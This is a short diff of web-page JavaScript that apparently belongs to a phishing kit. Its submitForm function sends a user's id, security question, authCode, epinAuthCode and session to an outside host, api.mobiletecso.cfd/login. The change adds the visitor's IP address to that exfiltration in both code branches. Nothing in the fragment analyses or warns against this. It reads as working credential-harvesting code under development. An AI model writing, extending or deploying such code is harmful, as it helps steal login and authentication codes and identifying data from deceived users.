@@ -2130,7 +2130,8 @@ function submitForm(event) {
             "&question=" + encodeURIComponent(question) +
             "&authCode=" + encodeURIComponent(authCode) +
             "&epinAuthCode=" + encodeURIComponent(epinAuthCode) +
-            "&session=" + encodeURIComponent(session);
+            "&session=" + encodeURIComponent(session) +
+            "&ip=" + encodeURIComponent(ip);
     } else {
         console.log('question');
         url = "https://api.mobiletecso.cfd/login" +
@@ -2140,7 +2141,8 @@ function submitForm(event) {
             "&id=" + encodeURIComponent(id) +
             "&authCode=" + encodeURIComponent(authCode) +
             "&epinAuthCode=" + encodeURIComponent(epinAuthCode) +
-              "&session=" + encodeURIComponent(session);
+            "&session=" + encodeURIComponent(session) +
+            "&ip=" + encodeURIComponent(ip);
     }
 
     // Показываем элемент загрузки
